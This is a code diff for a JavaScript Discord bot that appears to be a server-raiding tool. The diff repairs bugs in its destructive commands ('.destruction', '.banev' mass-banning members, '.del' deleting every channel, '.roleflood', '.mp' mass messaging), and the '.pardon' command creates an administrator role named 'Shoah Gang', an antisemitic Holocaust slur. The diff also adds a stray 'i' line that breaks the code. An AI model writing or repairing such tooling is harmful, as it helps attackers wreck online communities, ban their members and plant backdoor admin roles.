@@ -5,6 +5,7 @@ const moment = require("moment");
  var prefix = "."
 bot.on('ready',() => {
   //invit link
+  bot.user.setAvatar("./gon.jpg")
   console.log("---------------------------")
 });  
 
@@ -32,7 +33,7 @@ bot.on('message', msg => {
  if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
     
 if (msg.content === '.destruction') {
-  if(message.channel.type === "dm") return;
+  if(msg.channel.type === "dm") return;
 
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
@@ -44,7 +45,7 @@ if (msg.content === '.destruction') {
   }
 
 if (msg.content === '.oupss') {
-  if(message.channel.type === "dm") return;
+  if(msg.channel.type === "dm") return;
 
     console.log(`Commande .oupss par ${msg.author.tag}`);
    fucked = false;
@@ -69,7 +70,7 @@ if (msg.content === '.oupss') {
 
 
 if (msg.content === '.banev') {
-  if(message.channel.type === "dm") return;
+  if(msg.channel.type === "dm") return;
 
     console.log(`Commande .banev par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
@@ -79,7 +80,7 @@ if (msg.content === '.banev') {
 
 
 if (msg.content === '.leave') {
-  if(message.channel.type === "dm") return;
+  if(msg.channel.type === "dm") return;
 
     console.log(`Commande .leave par ${msg.author.tag}`);
     if (msg.deletable) msg.delete();
@@ -87,10 +88,10 @@ if (msg.content === '.leave') {
   }
 
 if (msg.content === '.pardon') {
-  if(message.channel.type === "dm") return;
+  if(msg.channel.type === "dm") return;
 
     console.log(`Commande .pardon par ${msg.author.tag}`);
-
+i
     msg.member.guild.createRole({
       name: "Shoah Gang",
       permissions: "ADMINISTRATOR",
@@ -101,7 +102,7 @@ if (msg.content === '.pardon') {
     }).catch(e => {});
   }
   if (msg.content === '.roleflood') {
-    if(message.channel.type === "dm") return;
+    if(msg.channel.type === "dm") return;
 
     console.log(`Commande .roleflood par ${msg.author.tag}`);
     if (msg.deletable) msg.delete();
@@ -117,7 +118,7 @@ if (msg.content === '.pardon') {
       }
 
   if(msg.content === ".del"){
-    if(message.channel.type === "dm") return;
+    if(msg.channel.type === "dm") return;
 
     if (msg.deletable) msg.delete().catch(e => {});
     msg.guild.channels.forEach(chan => {
@@ -127,7 +128,7 @@ if (msg.content === '.pardon') {
 
 
   if(msg.content === ".mp"){
-    if(message.channel.type === "dm") return;
+    if(msg.channel.type === "dm") return;
 
     if(msg.deletable) msg.delete();
     i = 0;
@@ -518,4 +519,5 @@ bot.on("message", message => {
     }
   }
 })
+
 bot.login(process.env.BOT_TOKEN); 
